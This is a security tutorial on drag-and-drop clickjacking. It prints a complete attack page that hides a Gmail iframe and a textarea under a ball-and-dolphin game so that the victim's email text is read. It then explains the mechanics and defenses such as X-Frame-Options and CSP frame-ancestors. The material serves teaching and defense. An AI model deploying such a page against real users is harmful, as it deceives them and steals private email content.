# 29 - Advanced Clickjacking: Drag-and-Drop Data Theft

## Beyond Clicking: Drag-and-Drop Clickjacking

Classic clickjacking tricks users into **clicking** a hidden button. Drag-and-drop clickjacking goes further — it tricks users into **selecting and dragging content** from a hidden iframe into a hidden textarea, allowing the attacker to **read data** from the victim's authenticated session.

This turns clickjacking from a **write-only** attack (trigger an action) into a **read** attack (steal data).

## Gmail Drag-and-Drop Clickjacking Demo

### The Full Attack Page

```html
<html>
<head>
  <title>Gmail Clickjacking with drag and drop Attack Demo</title>
  <style>
    .iframe_hidden {
      height: 50px; width: 50px;
      top: 360px; left: 365px;
      overflow: hidden;
      filter: alpha(opacity=0); opacity: 0;
      position: absolute;
    }
    .text_area_hidden {
      height: 30px; width: 30px;
      top: 160px; left: 670px;
      overflow: hidden;
      filter: alpha(opacity=0); opacity: 0;
      position: absolute;
    }
    .ball       { top: 350px; left: 350px; position: absolute; }
    .ball_1     { top: 136px; left: 640px;
                  filter: alpha(opacity=0); opacity: 0; position: absolute; }
    .Dolphin    { top: 150px; left: 600px; position: absolute; }
  </style>
  <script>
    function Init() {
      var source = document.getElementById("source");
      var target = document.getElementById("target");
      if (source.addEventListener) {
        target.addEventListener("drop", DumpInfo, false);
      } else {
        target.attachEvent("ondrop", DumpInfo);
      }
    }

    function DumpInfo(event) {
      showHide_ball.call(this);
      showHide_ball_1.call(this);
      var info = document.getElementById("info");
      info.innerHTML += "<span style='color:#3355cc; font-size:13px'>"
        + event.dataTransfer.getData('Text') + "</span><br>";
    }
  </script>
</head>
<body onload="Init();">
  <!-- The "ball" the user sees and tries to drag -->
  <img id="hide_ball" src="ball.png" class="ball">

  <!-- Hidden iframe loading Gmail -->
  <div id="source">
    <iframe id="iframe_1" src="https://mail.google.com/mail/ig/mailmax"
      class="iframe_hidden" scrolling="no"></iframe>
  </div>

  <!-- The "dolphin" the user tries to drag the ball to -->
  <img src="Dolphin.jpg" class="Dolphin">

  <!-- Hidden textarea that captures the dragged data -->
  <textarea id="target" class="text_area_hidden"></textarea>

  <!-- Stolen data displayed here -->
  <div id="info" style="position:absolute; background-color:#e0e0e0;
    font-weight:bold; top:600px;"></div>

  <center>
    Note: Clicking "ctrl + a" to select the ball, then drag it to the
    mouth of the dolphin with the mouse. Make sure you have logged into GMAIL.
  </center>
</body>
</html>
```

### How the Attack Works — Step by Step

**What the user sees:**
- A ball image and a dolphin image
- Instructions: "Press Ctrl+A to select the ball, then drag it to the dolphin's mouth"
- A simple drag-and-drop game

**What's actually happening:**

```
Visual Layer (what user sees)     Hidden Layer (what's really there)
─────────────────────────────     ──────────────────────────────────
  [Ball image]                      [Gmail iframe, opacity: 0]
  at (350, 350)                     at (360, 365), 50x50px

  [Dolphin image]                   [Textarea, opacity: 0]
  at (600, 150)                     at (670, 160), 30x30px
```

1. **The hidden Gmail iframe** (`opacity: 0`) is positioned directly over the ball image
2. **The hidden textarea** (`opacity: 0`) is positioned over the dolphin's mouth
3. When the user presses **Ctrl+A**, they think they're selecting the ball — but they're actually selecting **text content inside the Gmail iframe** (email content)
4. When the user **drags to the dolphin**, they're actually dropping the selected Gmail text into the **hidden textarea**
5. The `drop` event handler (`DumpInfo`) reads the dropped data via `event.dataTransfer.getData('Text')` and displays it

### The Critical Code

**The drop handler steals the data:**

```javascript
function DumpInfo(event) {
  var info = document.getElementById("info");
  info.innerHTML += "<span style='color:#3355cc; font-size:13px'>"
    + event.dataTransfer.getData('Text') + "</span><br>";
}
```

`event.dataTransfer.getData('Text')` retrieves whatever text the user dragged — which is the **Gmail email content** from the hidden iframe. The browser allows this because from its perspective, the user intentionally performed the drag-and-drop action.

### Why This Bypasses Same-Origin Policy

Normally, JavaScript on page A cannot read content from an iframe loading page B (same-origin policy). But the **drag-and-drop API** creates an exception:

- The **user** initiates the drag from inside the iframe (the browser trusts user actions)
- The **user** drops it onto the attacker's textarea
- The browser treats this as a user-consented data transfer
- The attacker's JavaScript can then read the dropped data

The user's physical action (drag-and-drop) serves as implicit "permission" to transfer data across origins.

## Clickjacking Evolution

| Generation | Technique | Capability |
|-----------|-----------|-----------|
| **1st** | Transparent iframe + positioned button | Trigger a click (write-only) |
| **2nd** | Image overlay + positioned links | Redirect clicks to attacker URLs |
| **3rd** | Drag-and-drop + hidden iframe/textarea | **Read data** from victim's session |

## Defenses

The same defenses apply as classic clickjacking, but drag-and-drop attacks emphasize the need for server-side protection:

- **`X-Frame-Options: DENY`** — prevents the page from being loaded in any iframe
- **CSP `frame-ancestors 'none'`** — modern equivalent
- **Disabling drag-and-drop** on sensitive pages via JavaScript or CSP
- Browsers have since tightened drag-and-drop behavior across origins
